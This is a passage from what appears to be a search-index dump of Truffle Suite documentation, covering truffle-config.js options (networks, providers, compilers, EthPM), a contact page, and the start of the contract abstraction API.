skipDryRun: - true if you don't want to test run the migration locally before the actual migration (default is false) // confirmations: - number of confirmations to wait between deployments (default: 0) // timeoutBlocks: - if a transaction is not mined, keep waiting for this number of blocks (default is 50) // deploymentPollingInterval: - duration between checks for completion of deployment transactions // disableConfirmationListener: - true to disable web3's confirmation listener } } For each network, if unspecified, transaction options will default to the following values: gas : Gas limit used for deploys. Default is 6721975 . gasPrice : Gas price used for deploys. Default is 20000000000 (20 Gwei). from : From address used during migrations. Defaults to the first available account provided by your Ethereum client. provider : Default web3 provider using host and port options: new Web3.providers.HttpProvider(\"http://<host>:<port>\") websockets : You will need this enabled to use the confirmations listener or to hear Events using .on or .once . Default is false . deploymentPollingInterval : When a smart contract is deployed, this determines how often to check whether the transaction has been completed, specified in milliseconds. Default is 4000 . Note that this is independent of the polling interval that provider may use. See @truffle/hdwallet-provider documentation if you are using HDWalletProvider and wish to specify a custom pollingInterval . Note that it is perfectly fine to set disableConfirmationListener while also setting a value for confirmations ; this will not cause hangs during deployment. For each network, you can specify host / port , url , or provider , but not more than one. If you need an HTTP provider, we recommend using host and port , or url , while if you need a custom provider such as HDWalletProvider , you must use provider . The url option also supports WebSockets and SSL. url should include the full url; see the examples below: - http://127.0.0.1:8545 - ws://127.0.0.1:8545 - https://sandbox.truffleteams.com/yoursandboxid - wss://sandbox.truffleteams.com/yoursandboxid Providers \u00b6 The following network list consists of a local test network and an Infura-hosted Ropsten network, both provided by HDWalletProvider. Make sure you wrap @truffle/hdwallet-provider instances in a function closure as shown below to ensure that only one network is ever connected at a time. networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ); }, network_id : '3' , }, test : { provider : function () { return new HDWalletProvider ( mnemonic , \"http://127.0.0.1:8545/\" ); }, network_id : '*' , }, } If you specify host and port instead of provider , Truffle will create its own default HTTP provider using that host and port, and no minimal network connection will be opened, so there is no need to do the function wrapping workaround. That said, you wouldn't be able to use a custom provider in this case. contracts_directory \u00b6 The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts. contracts_build_directory \u00b6 The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ). migrations_directory \u00b6 The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; mocha \u00b6 Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true } etherscan \u00b6 Configuration options that Truffle will use when attempting to download source code from Etherscan . Has one suboption: apiKey : The API key to use when retrieving source code from Etherscan. If omitted, source will be retrieved without an API key, which may be slower. Example: etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one } sourceFetchers \u00b6 A list of verified source repositories that Truffle may attempt to download source code from, in the order it should attempt to use them. Currently the supported repositories are \"etherscan\" (for Etherscan ) and \"sourcify\" (for Sourcify ). The default is [\"etherscan\", \"sourcify\"] , i.e., to check Etherscan first, then Sourcify. Example: sourceFetchers : [ \"sourcify\" , \"etherscan\" ] //prefer Sourcify over Etherscan Compiler configuration \u00b6 In the compilers object you can specify settings related to the compilers used by Truffle. solc \u00b6 Solidity compiler settings. Supports optimizer settings for solc , as well as other settings such as debug and metadata settings. You may specify... + any solc-js version listed at solc-bin . Specify the one you want and Truffle will get it for you. + a natively compiled solc binary (you'll need to install this yourself, links to help below). + a dockerized solc from one of images published here . + a path to a locally available solc + a solc-js parser for faster docker and native compilations Truffle config example: module . exports = { compilers : { solc : { version : < string > , // A version or constraint - Ex. \"^0.5.0\" // Can also be set to \"native\" to use a native solc docker : < boolean > , // Use a version obtained through docker parser : \"solcjs\" , // Leverages solc-js purely for speedy parsing settings : { optimizer : { enabled : < boolean > , runs : < number > // Optimize for how many times you intend to run the code }, evmVersion : < string > // Default: \"istanbul\" }, modelCheckerSettings : { // contains options for SMTChecker } } } } For more information, please see the Solidity documentation on Compiler Input JSON Description for the various possible settings. Note that customizing stopAfter and outputSelection are not currently supported. vyper \u00b6 Vyper compiler settings. Similar to the solc settings, but not as extensive. In particular, specifying a Vyper version is not currently supported; your local Vyper installation will always be used. Truffle config example: module . exports = { compilers : { vyper : { settings : { evmVersion : < string > } } } } Currently, only changing the settings is supported for Vyper; see the Vyper documentation on Compiler Input JSON Description for the possible settings. However customizing outputSelection is not supported, so currently the only supported setting is evmVersion . external compilers \u00b6 For more advanced use cases with artifact creation you can use the external compilers configuration. You can use this feature by adding a compilers.external object to your Truffle config: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ /* compilation output */ }] } } } When you run truffle compile, Truffle will run the configured command and look for contract artifacts specified by targets. This new configuration supports a couple of main use cases: Your compilation command outputs Truffle JSON artifacts directly. If your compilation command generates artifacts directly, or generates output that contains all the information for an artifact, configure a target as follows: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/artifacts/*.json\" }] } } } Truffle will execute your script, then expand the glob (*) and find all .json files in the listed path and copy those over as artifacts in the build/contracts/ directory. Your compilation command outputs individual parts of an artifact, and you want Truffle to generate the artifacts for you. The above use case might not be sufficient for all use cases. You can configure your target to run an arbitrary post-processing command: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/preprocessed-artifacts/*.json\" , command : \"./process-artifact\" }] } } } This will run ./process-artifact for each matched .json file, piping the contents of that file as stdin. Your ./process-artifact command is then expected to output a complete Truffle artifact as stdout. Want to provide the path as a filename instead? Add stdin: false to your target configuration. You can also specify the individual properties of your contracts and have Truffle generate the artifacts itself. module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ properties : { contractName : \"MyContract\" , /* other literal properties */ }, fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , /* other properties encoded in output files */ } }] } } } Specify properties and/or fileProperties , and Truffle will look for those values when building the artifacts. To override the working directory for all specified paths and running commands, use the workingDirectory option. For instance, the following will run ./proj/compile-contracts and read ./proj/output/contract.abi : module . exports = { compilers : { external : { command : \"./compile-contracts\" , workingDirectory : \"./proj\" , targets : [{ fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , } }] } } } plugins \u00b6 Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle supports two separate kinds of plugins. The first are run plugins that define a custom workflow command. More information on these can be found under Third-Party Plugin Commands . The second type of plugins are preserve plugins that define a custom workflow for preserving content using the truffle preserve command. More information on these can be found under Preserving Files and Content to Storage Platforms . Environments \u00b6 Environments are a way to specify different configuration parameters depending on the selected environment. For example, connection to IPFS is often done with a local node or ganache, while in production, it makes sense to connect to Infura. This can be configured with environments. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { ipfs : { address : 'http://localhost:5001 } }, production: { ipfs: { address: ' https : //ipfs.infura.io:5001' } } } } EthPM configuration \u00b6 This configuration applies to the optional ethpm.json file that exists alongside your truffle.js configuration file. package_name \u00b6 Name of the package you're publishing. Your package name must be unique to the EthPM registry. Example: package_name : \"adder\" version \u00b6 Version of this package, using the semver specification. Example: version : \"0.0.3\" description \u00b6 A text description of your package for human readers. Example: description : \"Simple contract to add two numbers\" authors \u00b6 An array of authors. Can have any format, but we recommend the format below. Example: authors : [ \"Tim Coulter <tim.coulter@consensys.net>\" ] keywords \u00b6 An array of keywords that tag this package with helpful categories. Example: keywords : [ \"ethereum\" , \"addition\" ], dependencies \u00b6 A list of EthPM packages your package depends on, using semver version ranges, like npm. Example: dependencies : { \"owned\" : \"^0.0.1\" , \"erc20-token\" : \"1.0.0\" } license \u00b6 License to use for this package; primarily informative. Contracts created with truffle create will also include this in their SPDX-License-Identifier comment. Example: license : \"MIT\" ,","title":"Configuration"},{"location":"docs/truffle/reference/configuration.html#configuration","text":"","title":"Configuration"},{"location":"docs/truffle/reference/configuration.html#location","text":"Your configuration file is called truffle-config.js and is located at the root of your project directory. This file is a Javascript file and can execute any code necessary to create your configuration. It must export an object representing your project configuration like the example below. module . exports = { networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" // Match any network id } }, compilers : { solc : { version : \"^0.8.0\" } } }; Be sure to check out the truffle-config.js contained by the barebones project that truffle init creates. The truffle-config.js contains a handful of commented out examples of some configuration options that you might specify/tweak.","title":"Location"},{"location":"docs/truffle/reference/configuration.html#resolving-naming-conflicts-on-windows","text":"Note : This only applies to Truffle version 4 and below. When using the Command Prompt on Windows, the default configuration file name can cause a conflict with the truffle executable, and so you may not be able to run Truffle commands properly on existing projects . This is because of the way that command precedence works on the Command Prompt. The truffle.cmd executable is on the path as part of the npm package, but the truffle.js configuration file is in the actual directory where the truffle command is run. Because .js is an acceptable executable extension by default, truffle.js takes precedence over truffle.cmd , causing unexpected results. Any of the following solutions will remedy this issue: Call the executable file explicitly using its .cmd extension ( truffle.cmd compile ) Edit the system PATHEXT environment variable and remove .JS; from the list of executable extensions Rename truffle.js to something else ( truffle-config.js ) Use Windows PowerShell or Git BASH , as these shells do not have this conflict.","title":"Resolving naming conflicts on Windows"},{"location":"docs/truffle/reference/configuration.html#general-options","text":"","title":"General options"},{"location":"docs/truffle/reference/configuration.html#build","text":"Build configuration of your application, if your application requires tight integration with Truffle. Most users likely will not need to configure this option. See the Build Processes section for more details.","title":"build"},{"location":"docs/truffle/reference/configuration.html#networks","text":"Specifies which networks are available for deployment during migrations, as well as specific transaction parameters when interacting with each network (such as gas price, from address, etc.). When compiling and running migrations on a specific network, contract artifacts will be saved and recorded for later use. When your contract abstractions detect that your Ethereum client is connected to a specific network, they'll use the contract artifacts associated that network to simplify app deployment. Networks are identified through Ethereum's net_version RPC call, as well as blockchain URIs. The networks object, shown below, is keyed by network names and each name contains a corresponding object that defines the parameters of the network. You will most likely want to provide your own network names and configurations to tell Truffle what networks to connect to for deployments and testing. Once you have defined your networks, you can provide the names as an option for certain commands; this is possible during testing or running migrations. You might specify a network name during migrations as follows: $ truffle migrate --network live Note that if no --network option is provided when using commands that require a network, Truffle will by default look for a network named \"development\" in your truffle-config.js . It will then use those settings to try and connect. See the provided examples below for some guidance on defining your networks. Example: networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , // match any network websockets : true }, live : { host : \"178.25.19.88\" , // Random IP for example purposes (do not use) port : 80 , network_id : 1 , // Ethereum public network // optional config values: // gas // gasPrice // from - default address to use for any transaction Truffle makes during migrations // provider - web3 provider instance Truffle should use to talk to the Ethereum network. // - function that returns a web3 provider instance (see below.) // - if specified, host and port are ignored. // skipDryRun: - true if you don't want to test run the migration locally before the actual migration (default is false) // confirmations: - number of confirmations to wait between deployments (default: 0) // timeoutBlocks: - if a transaction is not mined, keep waiting for this number of blocks (default is 50) // deploymentPollingInterval: - duration between checks for completion of deployment transactions // disableConfirmationListener: - true to disable web3's confirmation listener } } For each network, if unspecified, transaction options will default to the following values: gas : Gas limit used for deploys. Default is 6721975 . gasPrice : Gas price used for deploys. Default is 20000000000 (20 Gwei). from : From address used during migrations. Defaults to the first available account provided by your Ethereum client. provider : Default web3 provider using host and port options: new Web3.providers.HttpProvider(\"http://<host>:<port>\") websockets : You will need this enabled to use the confirmations listener or to hear Events using .on or .once . Default is false . deploymentPollingInterval : When a smart contract is deployed, this determines how often to check whether the transaction has been completed, specified in milliseconds. Default is 4000 . Note that this is independent of the polling interval that provider may use. See @truffle/hdwallet-provider documentation if you are using HDWalletProvider and wish to specify a custom pollingInterval . Note that it is perfectly fine to set disableConfirmationListener while also setting a value for confirmations ; this will not cause hangs during deployment. For each network, you can specify host / port , url , or provider , but not more than one. If you need an HTTP provider, we recommend using host and port , or url , while if you need a custom provider such as HDWalletProvider , you must use provider . The url option also supports WebSockets and SSL. url should include the full url; see the examples below: - http://127.0.0.1:8545 - ws://127.0.0.1:8545 - https://sandbox.truffleteams.com/yoursandboxid - wss://sandbox.truffleteams.com/yoursandboxid","title":"networks"},{"location":"docs/truffle/reference/configuration.html#providers","text":"The following network list consists of a local test network and an Infura-hosted Ropsten network, both provided by HDWalletProvider. Make sure you wrap @truffle/hdwallet-provider instances in a function closure as shown below to ensure that only one network is ever connected at a time. networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/YOUR-PROJECT-ID\" ); }, network_id : '3' , }, test : { provider : function () { return new HDWalletProvider ( mnemonic , \"http://127.0.0.1:8545/\" ); }, network_id : '*' , }, } If you specify host and port instead of provider , Truffle will create its own default HTTP provider using that host and port, and no minimal network connection will be opened, so there is no need to do the function wrapping workaround. That said, you wouldn't be able to use a custom provider in this case.","title":"Providers"},{"location":"docs/truffle/reference/configuration.html#contracts_directory","text":"The default directory for uncompiled contracts is ./contracts relative to the project root. If you wish to keep your contracts in a different directory you may specify a contracts_directory property. Example: To have Truffle find contracts in ./allMyStuff/someStuff/theContractFolder (recursively) at compile time: module . exports = { contracts_directory : \"./allMyStuff/someStuff/theContractFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Note : In addition to specifying a relative path, you can also use globs/regular expressions to selectively compile contracts.","title":"contracts_directory"},{"location":"docs/truffle/reference/configuration.html#contracts_build_directory","text":"The default output directory for compiled contracts is ./build/contracts relative to the project root. This can be changed with the contracts_build_directory key. Examples: To place the built contract artifacts in ./output/contracts : module . exports = { contracts_build_directory : \"./output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; The built contract artifacts do not need to be inside the project root: module . exports = { contracts_build_directory : \"../../../output\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } }; Absolute paths will also work. This is not recommended though, as an absolute path may not exist when compiled on another system. If you use absolute paths on Windows, make sure to use double backslashes for paths (example: C:\\\\Users\\\\Username\\\\output ).","title":"contracts_build_directory"},{"location":"docs/truffle/reference/configuration.html#migrations_directory","text":"The default migrations directory is ./migrations relative to the project root. This can be changed with the migrations_directory key. Example: module . exports = { migrations_directory : \"./allMyStuff/someStuff/theMigrationsFolder\" , networks : { development : { host : \"127.0.0.1\" , port : 8545 , network_id : \"*\" , } } };","title":"migrations_directory"},{"location":"docs/truffle/reference/configuration.html#mocha","text":"Configuration options for the MochaJS testing framework. This configuration expects an object as detailed in Mocha's documentation . Example: mocha : { useColors : true }","title":"mocha"},{"location":"docs/truffle/reference/configuration.html#etherscan","text":"Configuration options that Truffle will use when attempting to download source code from Etherscan . Has one suboption: apiKey : The API key to use when retrieving source code from Etherscan. If omitted, source will be retrieved without an API key, which may be slower. Example: etherscan : { apiKey : \"0123456789abcdef0123456789abcdef\" //replace this with your API key if you have one }","title":"etherscan"},{"location":"docs/truffle/reference/configuration.html#sourcefetchers","text":"A list of verified source repositories that Truffle may attempt to download source code from, in the order it should attempt to use them. Currently the supported repositories are \"etherscan\" (for Etherscan ) and \"sourcify\" (for Sourcify ). The default is [\"etherscan\", \"sourcify\"] , i.e., to check Etherscan first, then Sourcify. Example: sourceFetchers : [ \"sourcify\" , \"etherscan\" ] //prefer Sourcify over Etherscan","title":"sourceFetchers"},{"location":"docs/truffle/reference/configuration.html#compiler-configuration","text":"In the compilers object you can specify settings related to the compilers used by Truffle.","title":"Compiler configuration"},{"location":"docs/truffle/reference/configuration.html#solc","text":"Solidity compiler settings. Supports optimizer settings for solc , as well as other settings such as debug and metadata settings. You may specify... + any solc-js version listed at solc-bin . Specify the one you want and Truffle will get it for you. + a natively compiled solc binary (you'll need to install this yourself, links to help below). + a dockerized solc from one of images published here . + a path to a locally available solc + a solc-js parser for faster docker and native compilations Truffle config example: module . exports = { compilers : { solc : { version : < string > , // A version or constraint - Ex. \"^0.5.0\" // Can also be set to \"native\" to use a native solc docker : < boolean > , // Use a version obtained through docker parser : \"solcjs\" , // Leverages solc-js purely for speedy parsing settings : { optimizer : { enabled : < boolean > , runs : < number > // Optimize for how many times you intend to run the code }, evmVersion : < string > // Default: \"istanbul\" }, modelCheckerSettings : { // contains options for SMTChecker } } } } For more information, please see the Solidity documentation on Compiler Input JSON Description for the various possible settings. Note that customizing stopAfter and outputSelection are not currently supported.","title":"solc"},{"location":"docs/truffle/reference/configuration.html#vyper","text":"Vyper compiler settings. Similar to the solc settings, but not as extensive. In particular, specifying a Vyper version is not currently supported; your local Vyper installation will always be used. Truffle config example: module . exports = { compilers : { vyper : { settings : { evmVersion : < string > } } } } Currently, only changing the settings is supported for Vyper; see the Vyper documentation on Compiler Input JSON Description for the possible settings. However customizing outputSelection is not supported, so currently the only supported setting is evmVersion .","title":"vyper"},{"location":"docs/truffle/reference/configuration.html#external-compilers","text":"For more advanced use cases with artifact creation you can use the external compilers configuration. You can use this feature by adding a compilers.external object to your Truffle config: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ /* compilation output */ }] } } } When you run truffle compile, Truffle will run the configured command and look for contract artifacts specified by targets. This new configuration supports a couple of main use cases: Your compilation command outputs Truffle JSON artifacts directly. If your compilation command generates artifacts directly, or generates output that contains all the information for an artifact, configure a target as follows: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/artifacts/*.json\" }] } } } Truffle will execute your script, then expand the glob (*) and find all .json files in the listed path and copy those over as artifacts in the build/contracts/ directory. Your compilation command outputs individual parts of an artifact, and you want Truffle to generate the artifacts for you. The above use case might not be sufficient for all use cases. You can configure your target to run an arbitrary post-processing command: module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ path : \"./path/to/preprocessed-artifacts/*.json\" , command : \"./process-artifact\" }] } } } This will run ./process-artifact for each matched .json file, piping the contents of that file as stdin. Your ./process-artifact command is then expected to output a complete Truffle artifact as stdout. Want to provide the path as a filename instead? Add stdin: false to your target configuration. You can also specify the individual properties of your contracts and have Truffle generate the artifacts itself. module . exports = { compilers : { external : { command : \"./compile-contracts\" , targets : [{ properties : { contractName : \"MyContract\" , /* other literal properties */ }, fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , /* other properties encoded in output files */ } }] } } } Specify properties and/or fileProperties , and Truffle will look for those values when building the artifacts. To override the working directory for all specified paths and running commands, use the workingDirectory option. For instance, the following will run ./proj/compile-contracts and read ./proj/output/contract.abi : module . exports = { compilers : { external : { command : \"./compile-contracts\" , workingDirectory : \"./proj\" , targets : [{ fileProperties : { abi : \"./output/contract.abi\" , bytecode : \"./output/contract.bytecode\" , } }] } } }","title":"external compilers"},{"location":"docs/truffle/reference/configuration.html#plugins","text":"Note : This feature is new and still in a barebones state. Please let us know how we can improve it! Provides Truffle with a list of installed third-party extensions installed as NPM package dependencies. Truffle supports two separate kinds of plugins. The first are run plugins that define a custom workflow command. More information on these can be found under Third-Party Plugin Commands . The second type of plugins are preserve plugins that define a custom workflow for preserving content using the truffle preserve command. More information on these can be found under Preserving Files and Content to Storage Platforms .","title":"plugins"},{"location":"docs/truffle/reference/configuration.html#environments","text":"Environments are a way to specify different configuration parameters depending on the selected environment. For example, connection to IPFS is often done with a local node or ganache, while in production, it makes sense to connect to Infura. This can be configured with environments. module . exports = { /* ... rest of truffle-config */ environments : { /* ... other environments */ development : { ipfs : { address : 'http://localhost:5001 } }, production: { ipfs: { address: ' https : //ipfs.infura.io:5001' } } } }","title":"Environments"},{"location":"docs/truffle/reference/configuration.html#ethpm-configuration","text":"This configuration applies to the optional ethpm.json file that exists alongside your truffle.js configuration file.","title":"EthPM configuration"},{"location":"docs/truffle/reference/configuration.html#package_name","text":"Name of the package you're publishing. Your package name must be unique to the EthPM registry. Example: package_name : \"adder\"","title":"package_name"},{"location":"docs/truffle/reference/configuration.html#version","text":"Version of this package, using the semver specification. Example: version : \"0.0.3\"","title":"version"},{"location":"docs/truffle/reference/configuration.html#description","text":"A text description of your package for human readers. Example: description : \"Simple contract to add two numbers\"","title":"description"},{"location":"docs/truffle/reference/configuration.html#authors","text":"An array of authors. Can have any format, but we recommend the format below. Example: authors : [ \"Tim Coulter <tim.coulter@consensys.net>\" ]","title":"authors"},{"location":"docs/truffle/reference/configuration.html#keywords","text":"An array of keywords that tag this package with helpful categories. Example: keywords : [ \"ethereum\" , \"addition\" ],","title":"keywords"},{"location":"docs/truffle/reference/configuration.html#dependencies","text":"A list of EthPM packages your package depends on, using semver version ranges, like npm. Example: dependencies : { \"owned\" : \"^0.0.1\" , \"erc20-token\" : \"1.0.0\" }","title":"dependencies"},{"location":"docs/truffle/reference/configuration.html#license","text":"License to use for this package; primarily informative. Contracts created with truffle create will also include this in their SPDX-License-Identifier comment. Example: license : \"MIT\" ,","title":"license"},{"location":"docs/truffle/reference/contact-the-developers.html","text":"Contact the developers \u00b6 Open a Support Ticket! NEW The easiest way to track your conversation and contribute to our knowledge base! Open a support ticket to begin talking to our support staff. Common questions will be added to our knowledge base to assist future Trufflers! Open a Support Ticket Gitter \u00b6 The fastest way to get help is to reach out on our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions. Issue Tracker \u00b6 If you find a bug or want to recommend a new feature, the best way to reach us is by raising an issue on the GitHub project pages for Truffle , Ganache , or Drizzle . If you're using another one of our tools or libraries, you may want to check out our full list of GitHub projects to be sure you're raising your issue in the best place. Twitter \u00b6 If you want to reach out to give us some feedback you can always tweet at us ! SIGN UP FOR THE TRUFFLE MAILING LIST Sign up today to be a member of the Truffle mailing list. You'll be added to our low volume mailing list which we'll use to communicate future changes, development ideas and allow you to shape Truffle's development. hbspt.forms.create({ portalId: \"4795067\", formId: \"d18995c8-32bb-4b2d-bde9-3f49fb3d2837\" });","title":"Contact the Developers"},{"location":"docs/truffle/reference/contact-the-developers.html#contact-the-developers","text":"","title":"Contact the developers"},{"location":"docs/truffle/reference/contact-the-developers.html#gitter","text":"The fastest way to get help is to reach out on our community Gitter channel , where hundreds of your fellow Trufflers congregate to answer your questions.","title":"Gitter"},{"location":"docs/truffle/reference/contact-the-developers.html#issue-tracker","text":"If you find a bug or want to recommend a new feature, the best way to reach us is by raising an issue on the GitHub project pages for Truffle , Ganache , or Drizzle . If you're using another one of our tools or libraries, you may want to check out our full list of GitHub projects to be sure you're raising your issue in the best place.","title":"Issue Tracker"},{"location":"docs/truffle/reference/contact-the-developers.html#twitter","text":"If you want to reach out to give us some feedback you can always tweet at us !","title":"Twitter"},{"location":"docs/truffle/reference/contract-abstractions.html","text":"Contract Abstractions \u00b6 Truffle provides contract abstractions for interacting with your contracts. Skip ahead to the api section for a list of contract methods. Usage \u00b6 To obtain a contract abstraction you can require it with the contract name from the artifacts object. Outside of the console this is an object available in migration files, tests, and exec scripts. You would require your contract as follows: const MyContract = artifacts . require ( \"MyContract\" ); You can also obtain one in the developer console. Your contract types are available here and all you need to do is use the at , deployed , or new method. truffle ( development ) > const myContract = await MyContract . deployed (); You now have access to the following functions on MyContract , as well as many others: at() : Create an instance of MyContract that represents your contract at a specific address. deployed() : Create an instance of MyContract that represents the default address managed by MyContract . new() : Deploy a new version of this contract to the network, getting an instance of MyContract that represents the newly deployed instance. Each instance is tied to a specific address on the Ethereum network, and each instance has a 1-to-1 mapping from Javascript functions to contract functions. For instance, if your Solidity contract had a function defined someFunction(uint value) {} (solidity), then you could execute that function on the network like so: let deployed ; MyContract . deployed () . then (( instance ) => { deployed = instance ; return deployed . someFunction ( 5 ); }). then (( result ) => { // Do something with the result or continue with more transactions. }); You can also use async/await syntax which is often much less verbose. We will use async/await for the rest of this document but you may also use a promises for interfacing with contract methods as well. const deployed = await MyContract . deployed (); const result = await deployed . someFunction ( 5 ); // Do something with the result or continue with more transactions. See the processing transaction results section to learn more about the results object obtained from making transactions. Contract methods and events have an EventEmitter interface. So you can set up handlers like the following: const example = await artifacts . require ( \"Example\" ). deployed (); example . setValue ( 45 ) . on ( 'transactionHash' , hash => {}) . on ( 'receipt' , receipt => {}) . on ( 'error' , error => {}) . on ( 'confirmation' , ( num , receipt ) => {}) . then ( receipt => {}); example . ExampleEvent () . on ( 'data' , event => ... etc ... ) example . ExampleEvent () . once ( 'data' , event => ... etc ... ) API \u00b6 There are two API's you'll need to be aware of. One is the static Contract Abstraction API and the other is the Contract Instance API. The Abstraction API is a set of functions that exist for all contract abstractions, and those function exist on the abstraction itself (i.e., MyContract.at() ). In contrast, the Instance API is the API available to contract instances -- i.e., abstractions that represent a specific contract on the network -- and that API is created dynamically based on functions available in your Solidity source file. Contract Abstraction API \u00b6 Each contract abstraction -- MyContract in the examples above -- have the following useful functions: MyContract.new([arg1, arg2, ...], [tx params]) \u00b6 This function take whatever contructor parameters your contract requires and deploys a new instance of the contract to the network. There's an optional last argument which you can use to pass transaction parameters including the transaction from address, gas limit and gas price. This function returns a Promise that resolves into a new instance of the contract abstraction at the newly deployed address. MyContract.at(address) \u00b6 This function creates a new instance of the contract abstraction representing the contract at the passed in address. Returns a \"thenable\" object (not yet an actual Promise for backward compatibility). Resolves to a contract abstraction instance after ensuring code exists at the specified address. MyContract.deployed() \u00b6 Creates an instance of the contract abstraction representing the contract at its deployed address. The deployed address is a special value given to @truffle/contract that, when set, saves the address internally so that the deployed address can be inferred from the given Ethereum network being used. This allows you to write code referring to a specific deployed contract without having to manage those addresses yourself. Like at() , deployed() is thenable, and will resolve to a contract abstraction instance representing the deployed contract after ensuring that code exists at that location and that that address exists on the network being used. MyContract.link(instance) \u00b6 Link a library represented by a contract abstraction instance to MyContract. The library must first be deployed and have its deployed address set. The name and deployed address will be inferred from the contract abstraction instance. When this form of MyContract.link() is used, MyContract will consume all of the linked library's events and will be able to report that those events occurred during the result of a transaction. Libraries can be linked multiple times and will overwrite their previous linkage. Note: This method has two other forms, but this form is recommended. MyContract.link(name, address) \u00b6 Link a library with a specific name and address to MyContract. The library's events will not be consumed using this form. MyContract.link(object) \u00b6 Link multiple libraries denoted by an Object to MyContract. The keys must be strings representing the library names and the values must be strings representing the addresses. Like above, libraries' events will not be consumed using this form. MyContract.networks() \u00b6 View a list of network ids this contract abstraction has been set up to represent. MyContract.setProvider(provider) \u00b6 Sets the web3 provider this contract abstraction will use to make transactions. MyContract.setNetwork(network_id) \u00b6 Sets the network that MyContract is currently representing. MyContract.hasNetwork(network_id) \u00b6 Returns a boolean denoting whether or not this contract abstraction is set up to represent a specific network. MyContract.defaults([new_defaults]) \u00b6 Get's and optionally sets transaction defaults for all instances created from this abstraction. If called without any parameters it will simply return an Object representing current defaults. If an Object is passed, this will set new defaults. Example default transaction values that can be set are: MyContract . defaults ({ from : ..., gas : ..., gasPrice : ..., value : ... }) Setting a default from address, for instance, is useful when you have a contract abstraction you intend to represent one user (i.e., one address). MyContract.clone(network_id) \u00b6 Clone a contract abstraction to get another object that manages the same contract artifacts, but using a different network_id . This is useful if you'd like to manage the same contract but on a different network. When using this function, don't forget to set the correct provider afterward. const MyOtherContract = MyContract . clone ( 1337 ); MyContract.numberFormat = number_type \u00b6 You can set this property to choose the number format that abstraction methods return. The default behavior is to return BN. // Choices are: `[\"BigNumber\", \"BN\", \"String\"]. const Example = artifacts . require ( 'Example' ); Example . numberFormat = 'BigNumber' ; MyContract.timeout(block_timeout) \u00b6 This method allows you to set the block timeout for transactions. Contract instances created from this abstraction will have the specified transaction block timeout. This means that if a transaction does not immediately get mined, it will retry for the specified number of blocks. MyContract.autoGas = <boolean> \u00b6 If this is set to true, instances created from this abstraction will use web3.eth.estimateGas and then apply a gas multiplier to determine the amount of gas to include with the transaction. The default value for this is true . See gasMultiplier . MyContract.gasMultiplier(gas_multiplier) \u00b6 This is the value used when autoGas is enabled to determine the amount of gas to include with transactions. The gas is computed by using web3.eth.estimateGas and multiplying it by the gas multiplier. The default value is 1.25 . Contract Instance API \u00b6 Each contract instance is different based on the source Solidity contract, and the API is created dynamically. For the purposes of this documentation, let's use the following Solidity source code below: contract MyContract { uint public value ; event ValueSet ( uint val ); function setValue ( uint val ) { value = val ; emit ValueSet ( value ); } function getValue () view returns ( uint ) { return value ; } } From Javascript's point of view, this contract has three functions: setValue , getValue and value . This is because value is public and automatically creates a getter function for it. Making a transaction via a contract function \u00b6 When we call setValue() , this creates a transaction. From Javascript: const result = await instance . setValue ( 5 ); // result object contains import information about the transaction console . log ( \"Value was set to\" , result . logs [ 0 ]. args . val ); The result object that gets returned looks like this: { tx : \"0x6cb0bbb6466b342ed7bc4a9816f1da8b92db1ccf197c3f91914fc2c721072ebd\" , receipt : { // The return value from web3.eth.getTransactionReceipt(hash) // See https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethgettransactionreceipt }, logs : [ { logIndex : 0 , transactionIndex : 0 , transactionHash : '0x728b4d1983cd00d93ae00b7adf76f78c1b32d922de636ead42e93f70cf58cdc9' , blockHash : '0xdce5e6c580267c9bf1d82bf0a167fa60509ef9fc520b8619d8183a8373a42035' , blockNumber : 19 